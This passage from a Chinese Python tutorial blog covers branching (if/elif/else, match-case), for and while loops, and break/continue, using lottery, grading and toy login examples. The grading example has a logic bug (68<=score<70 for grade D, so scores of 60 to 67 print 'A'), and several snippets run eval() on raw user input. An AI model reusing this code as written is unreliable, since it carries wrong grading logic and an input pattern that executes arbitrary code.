class="hljs-string">&#x27;幸运数字：&#x27;</span>,luck_number)<br><br></code></pre></td></tr></table></figure><h3 id="2-选择结构"><a href="#2-选择结构" class="headerlink" title="2.选择结构"></a>2.选择结构</h3><p>选择结构也称分支结构，是按照条件选择执行不同的代码段</p><h4 id="1-单分支结构if的语法结构"><a href="#1-单分支结构if的语法结构" class="headerlink" title="1.单分支结构if的语法结构"></a>1.单分支结构if的语法结构</h4><p>if 表达式： </p><p>​语句块</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170828021.png" alt="image-20251024143102285"></p><p>执行流程：</p><p>如果表达式的值为True，就执行语句快，如果表达式的值为False，就跳过语句块，继续执行后面的代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例4-2单分支结构if</span><br>number = eval(input(<span class="hljs-string">&#x27;请输入您的6位中奖号码：&#x27;</span>))<br><span class="hljs-comment"># 使用if语句</span><br><span class="hljs-keyword">if</span> number == 987654:  # 等值判断<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜您，中奖了!&#x27;</span>)<br><span class="hljs-keyword">if</span> number != 987654:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;您未中本期大奖&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----以上if判新的表达式，是通过比较运算符计算出来的，结果是布尔值类型----&#x27;</span>)<br>n = 98  # 赋值操作<br><span class="hljs-keyword">if</span> n % 2:  # 98%2的余数是0，0的布尔值是<span class="hljs-literal">FaLse</span>，非0的布尔值为<span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(n, <span class="hljs-string">&#x27;是奇数&#x27;</span>)  # 由于98%2的余数是0，所以该行代码不执行<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> n % 2:  # 98%2的余数是0，0的布尔值是<span class="hljs-literal">FaLse</span>，<span class="hljs-keyword">not</span> <span class="hljs-literal">FaLse</span>的结采为<span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(n, <span class="hljs-string">&#x27;为偶数&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;------判断一个字符串是否是空字符串----&#x27;</span>)<br>x = input(<span class="hljs-string">&#x27;请输入一个字符串：&#x27;</span>)<br><span class="hljs-keyword">if</span> x:  # 在Python中一切皆对象，每个对象都有一个布尔值，而非空字符串的布尔值为<span class="hljs-literal">True</span>，空字<br>符串的布尔值为<span class="hljs-literal">False</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x是一个非空字符串&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x:  # 空字符中的布尔值为<span class="hljs-literal">False</span>,取反，<span class="hljs-keyword">not</span> <span class="hljs-literal">FaLse</span>的结采为<span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x是一个空字符串&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----表达式也可以是一个单纯的布尔型变量------&#x27;</span>)<br>flag = eval(input(<span class="hljs-string">&#x27;请输入一个布尔类型的值：True或False&#x27;</span>))<br><span class="hljs-keyword">if</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag的值为True&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag的值为False&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----使用if语句时，如果语句块中只有一句代码，可以将语句块直接写在冒号的后面------</span><br><span class="hljs-string">&#x27;</span>)<br>a = 10<br>b = 5<br><span class="hljs-keyword">if</span> a &gt; b: max = a  # 语句块只有一句，赋最大值<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a和b的最大值为：&#x27;</span>,max)<br><br></code></pre></td></tr></table></figure><h4 id="2-双分支结构if…else…语法结构"><a href="#2-双分支结构if…else…语法结构" class="headerlink" title="2.双分支结构if…else…语法结构"></a>2.双分支结构if…else…语法结构</h4><p>if 表达式： </p><p>​语句1 </p><p>else： </p><p>​语句2</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170831769.png" alt="image-20251024143155181"></p><p>执行流程:</p><p>如果表达式的值为True，就执行语句1，否则就执行语句2</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 双分支结构if…else…</span><br>number = eval(input(<span class="hljs-string">&#x27;请输入您的6位中奖号码：&#x27;</span>))<br><span class="hljs-comment"># if…else…</span><br><span class="hljs-keyword">if</span> number == 987654:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜您中奖了!&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;您未中本期大奖&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;------以上代码可以使用条件表达式进行简化---&#x27;</span>)<br><span class="hljs-attribute">result</span>=<span class="hljs-string">&#x27;恭喜您中奖了!&#x27;</span> <span class="hljs-keyword">if</span> number == 987654 <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;您未中本期大奖&#x27;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜您中奖了!&#x27;</span> <span class="hljs-keyword">if</span> number == 987654 <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;您未中本期大奖&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-多分支语法结构"><a href="#3-多分支语法结构" class="headerlink" title="3.多分支语法结构"></a>3.多分支语法结构</h4><p>if 表达式1：  </p><p>​语句块1 </p><p>elif 表达式2： </p><p>​语句块2 </p><p>elif 表达式n：</p><pre><code class="hljs"> 语句块n </code></pre><p>else: </p><p>​语句块n+1</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170834362.png" alt="image-20251024143306529"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例4-4多分支结构的使用</span><br>score=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入您的成绩：&#x27;</span>))<br><span class="hljs-comment"># 多分支结构</span><br><span class="hljs-keyword">if</span> score&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> score&gt;<span class="hljs-number">100</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;成绩有误！&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-number">0</span>&lt;=score&lt;<span class="hljs-number">60</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;E&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-number">68</span>&lt;=score&lt;<span class="hljs-number">70</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;D&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-number">70</span>&lt;=score&lt;<span class="hljs-number">80</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-number">80</span>&lt;=score&lt;=<span class="hljs-number">90</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;B&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>单分支结构、双分支结构和多分支结构在实际开发中是可以互相嵌套使用的，内层的分支结构将作为外 层分支结构的语句块使用</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170836539.png" alt="image-20251024143331562"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例4-5嵌套if的使用</span><br><span class="hljs-attribute">answer</span>=input(&#x27;请问您喝酒了吗？&#x27;)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">answer</span>==&#x27;y&#x27;: #answer的值为y表示喝酒了<br>    <span class="hljs-attribute">proof</span>=eval(input(&#x27;请输入酒精含量：&#x27;))<br>    <span class="hljs-keyword">if</span> proof&lt;20:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;构不成酒驾，祝你一路平安&#x27;</span>)<br>    elif proof&lt;80: # 20&lt;=proof&lt;80<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;已构成酒驾，请不要开车&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;已构成醉驾，请不要开车车！&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;你走吧，没你啥事儿！&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>在使用and连接多个判断条件时，只有同时满足多个条件，才能执行if后面的语句块。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170838442.png" alt="image-20251024143346814"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例4-6使用and连接多个选择条件</span><br><span class="hljs-attribute">user_name</span>=input(&#x27;请输入你的用户名：&#x27;)<br><span class="hljs-attribute">pwd</span>=input(&#x27;请输入你的密码：&#x27;)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">user_name</span>==&#x27;aaaa&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">pwd</span>==&#x27;888888&#x27;:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;登录成功！&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户名或密码不正确&#x27;</span>)<br>    <br><span class="hljs-comment"># 示例4-7使用or连接多个选择条件   </span><br><span class="hljs-attribute">score</span>=eval(input(&#x27;请输入您的成绩：&#x27;))<br><span class="hljs-keyword">if</span> score&lt;0 <span class="hljs-keyword">or</span> score&gt;100:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;成绩无效！&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;您的成绩为&#x27;</span>,score)<br>    <br><span class="hljs-comment">#示例4-8Python3.11新特性-模式匹配</span><br>score = input(<span class="hljs-string">&#x27;请输入成绩等级：&#x27;</span>)<br>match score:<br>    case <span class="hljs-string">&#x27;A&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;优秀&#x27;</span>)<br>    case <span class="hljs-string">&#x27;B&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;良好&#x27;</span>)<br>    case <span class="hljs-string">&#x27;C&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;中等&#x27;</span>)<br>    case <span class="hljs-string">&#x27;D&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;及格&#x27;</span>)<br>    case <span class="hljs-string">&#x27;E&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;不及格&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="3-循环结构"><a href="#3-循环结构" class="headerlink" title="3.循环结构"></a>3.循环结构</h3><p>在Python中循环结构分两类，一类是遍历循环for，一类是无限循环while</p><h4 id="1-遍历循环for的语句结构"><a href="#1-遍历循环for的语句结构" class="headerlink" title="1.遍历循环for的语句结构"></a>1.遍历循环for的语句结构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170841385.png" alt="image-20251024143448996"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170844875.png" alt="image-20251024143451861"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例4-9遍历for循环的使用</span><br><span class="hljs-comment"># 遍历字符串</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;hello&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-comment"># range函数，Python中的内置函数，产生一个[n,m)的整数序列，包含n，但是不包含m</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):<br>    <span class="hljs-comment"># print(i)</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&#x27;是偶数&#x27;</span>)<br><span class="hljs-comment"># 计算1-10之间的累加和</span><br>s = <span class="hljs-number">0</span>  <span class="hljs-comment"># 用于存储累加和</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):<br>    s += i  <span class="hljs-comment"># 相当于 s=s+i</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1-10之间的累加和为：&#x27;</span>, s)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------100到999之间的水仙花数-------------&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">153=3*3*3+5*5*5+1*1*1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>):<br>    sd = i % <span class="hljs-number">10</span>  <span class="hljs-comment"># 获取个位上的数字   假设   153%10--&gt; 3</span><br>    tens = i // <span class="hljs-number">10</span> % <span class="hljs-number">10</span>  <span class="hljs-comment"># 获取十位上的数字   153//10--&gt;15   15%10=5</span><br>    hundred = i // <span class="hljs-number">100</span>  <span class="hljs-comment"># 获取百位上的数字 153//100--&gt;1</span><br>    <span class="hljs-comment"># 判断</span><br>    <span class="hljs-keyword">if</span> sd**<span class="hljs-number">3</span>+tens**<span class="hljs-number">3</span>+hundred**<span class="hljs-number">3</span>==i:<br>        <span class="hljs-built_in">print</span>(i)<br>        <br>        <br><span class="hljs-comment"># 示例4-10遍历循环扩展形式</span><br>s=<span class="hljs-number">0</span> <span class="hljs-comment"># 用于存储累加和</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>    s+=i<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1-10之间的累加和为：&#x27;</span>,s)   <br></code></pre></td></tr></table></figure><h4 id="2-无限循环while的语句结构"><a href="#2-无限循环while的语句结构" class="headerlink" title="2.无限循环while的语句结构"></a>2.无限循环while的语句结构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170847972.png" alt="image-20251024143515507"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170855789.png" alt="image-20251024143521133"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例4-11无限循环while的使用</span><br><span class="hljs-comment"># (1)初始化变量</span><br><span class="hljs-attribute">answer</span>=input(&#x27;今天上课吗？y/n&#x27;)<br><span class="hljs-keyword">while</span> <span class="hljs-attribute">answer</span>==&#x27;y&#x27;: #　（2）条件判断<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;好好学习，天天向上&#x27;</span>) # （3）语句块<br>    # （4）改变变量<br>    <span class="hljs-attribute">answer</span>=input(&#x27;今天要上课吗？y/n&#x27;)<br><span class="hljs-comment"># 1-100之间的累加和</span><br><span class="hljs-attribute">s</span>=0 # 存储累加和<br><span class="hljs-attribute">i</span>=1 # (1)初始化变量<br><span class="hljs-keyword">while</span> i&lt;=100: # （2）条件判断<br>        s+=i # (3)语句块<br>        # (4) 改变变量<br>        i+=1 #　相当于<span class="hljs-attribute">i</span>=i+1<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1-100之间的累加和为：&#x27;</span>,s)<br><span class="hljs-comment"># 示例4-12无限循环while的扩展形式</span><br><span class="hljs-comment"># 1-100之间的累加和</span><br><span class="hljs-attribute">s</span>=0 # 存储累加和<br><span class="hljs-attribute">i</span>=1 # (1)初始化变量<br><span class="hljs-keyword">while</span> i&lt;=100: # （2）条件判断<br>        s+=i # (3)语句块<br>        # (4) 改变变量<br>        i+=1 #　相当于<span class="hljs-attribute">i</span>=i+1<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1-100之间的累加和为：&#x27;</span>,s)<br> <br><span class="hljs-comment"># 示例4-13使用无限循环模拟用户登录    </span><br><span class="hljs-comment">#(1)初始化变量</span><br><span class="hljs-attribute">i</span>=0<br><span class="hljs-keyword">while</span> i&lt;3: # (2)条件判断<br>    # (3)语句块<br>    <span class="hljs-attribute">user_name</span>=input(&#x27;请输入您的用户名：&#x27;)<br>    <span class="hljs-attribute">pwd</span>=input(&#x27;请输入您的密码：&#x27;)<br>    # 登录操作，<span class="hljs-keyword">if</span>…<span class="hljs-keyword">else</span>…<br>    <span class="hljs-keyword">if</span> <span class="hljs-attribute">user_name</span>==&#x27;zjh&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">pwd</span>==&#x27;888888&#x27;:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;系统正在登录，请稍候~&#x27;</span>)<br>        # 需要改变循环变量，目的，退出循环<br>        <span class="hljs-attribute">i</span>=8 # 第三行 判断 i&lt;3,8&lt;3 <span class="hljs-literal">False</span>退出<span class="hljs-keyword">while</span>循环<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> i&lt;2:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户名或密码不正确，你还有&#x27;</span>,2-i,<span class="hljs-string">&#x27;次机会&#x27;</span>)<br>            i+=1 # 相当于<span class="hljs-attribute">i</span>=i+1   #(4)改变变量<br><span class="hljs-comment"># 单分支的判断</span><br><span class="hljs-keyword">if</span> <span class="hljs-attribute">i</span>==3: #　当用户名或密码输入三次不正确的时候，循环执行结束了，i的最大值为3<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;对不起，三次均输入错误！&#x27;</span>)   <br></code></pre></td></tr></table></figure><p>循环结构也可以互相嵌套，在一个循环结构中嵌套另一个完整的循环结构就称为嵌套循环</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171001930.png" alt="image-20251024143542939"></p><p>在嵌套循环中通常用于输出一些图形，例如长方形、三角形、菱形等</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171003164.png" alt="image-20251024143549895"></p><h2 id="4-程序跳转语句"><a href="#4-程序跳转语句" class="headerlink" title="4.程序跳转语句"></a>4.程序跳转语句</h2><h3 id="1-break"><a href="#1-break" class="headerlink" title="1.break"></a>1.break</h3><p>程序跳转语句break用于跳（退）出循环结构，通常与if一起搭配使用</p><h4 id="1-无限循环语法结构"><a href="#1-无限循环语法结构" class="headerlink" title="1.无限循环语法结构"></a>1.无限循环语法结构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171005936.png" alt="image-20251024144256435"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171007515.png" alt="image-20251024144300266"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例4-18跳转语句break在while循环中的使用</span><br><span class="hljs-attribute">s</span>=0 # 存储累加和<br><span class="hljs-attribute">i</span>=1 # （1）初始化变量<br><span class="hljs-keyword">while</span> i&lt;11: # （2）条件判断<br>    #（3）语句块<br>    s+=i<br>    <span class="hljs-keyword">if</span> s&gt;20:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;累加和大于20的当前数是：&#x27;</span>,i)<br>        break<br>    i+=1 # （4）改变变量<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;--------------------&#x27;</span>)<br><span class="hljs-attribute">i</span>=0 # 统计登录的次数 （1）初始化变量<br><span class="hljs-keyword">while</span> i&lt;3: # （2）条件判断<br>    # （3）语句块<br>    <span class="hljs-attribute">user_name</span>=input(&#x27;请输入用户名：&#x27;)<br>    <span class="hljs-attribute">pwd</span>=input(&#x27;请输入密码：&#x27;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-attribute">user_name</span>==&#x27;zjh&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">pwd</span>==&#x27;888888&#x27;:<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;系统正在登录，请稍候……&#x27;</span>)<br>       break<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> i&lt;2:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户名或密码不正确，你还有&#x27;</span>,2-i,<span class="hljs-string">&#x27;次机会&#x27;</span>)<br>    # (4)改变变量<br>    i+=1<br><span class="hljs-keyword">else</span>: # <span class="hljs-keyword">while</span>…<span class="hljs-keyword">else</span>…<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;三次均输入错误！&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="2-遍历循环语法结构"><a href="#2-遍历循环语法结构" class="headerlink" title="2.遍历循环语法结构"></a>2.遍历循环语法结构</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171011970.png" alt="image-20251024144328503"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171013417.png" alt="image-20251024144331155"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vim"># 示例<span class="hljs-number">4</span>-<span class="hljs-number">19</span><span class="hljs-keyword">break</span>在<span class="hljs-keyword">for</span>循环中的使用<br><span class="hljs-keyword">for</span> i in <span class="hljs-string">&#x27;hello&#x27;</span>:<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-string">&#x27;e&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">print</span>(i)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;-----------------------&#x27;</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    # （<span class="hljs-number">3</span>）语句块<br>    user_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入用户名：&#x27;</span>)<br>    <span class="hljs-keyword">pwd</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密码：&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user_name == <span class="hljs-string">&#x27;zjh&#x27;</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">pwd</span> == <span class="hljs-string">&#x27;888888&#x27;</span>:<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;系统正在登录，请稍候……&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;用户名或密码不正确，你还有&#x27;</span>, <span class="hljs-number">2</span> - i, <span class="hljs-string">&#x27;次机会&#x27;</span>)<br><span class="hljs-keyword">else</span>: # <span class="hljs-keyword">for</span>…<span class="hljs-keyword">else</span>…<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;三次均输入错误！&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-continue"><a href="#3-continue" class="headerlink" title="3.continue"></a>3.continue</h3><p>continue的作用是用于跳过本次循环的后续代码，而继续执行 </p><p>下一次循环操作，continue在循环中通常也是与if一起搭配使用</p><h4 id="1-无限循环语法结构-1"><a href="#1-无限循环语法结构-1" class="headerlink" title="1.无限循环语法结构"></a>1.无限循环语法结构</h4><p><img 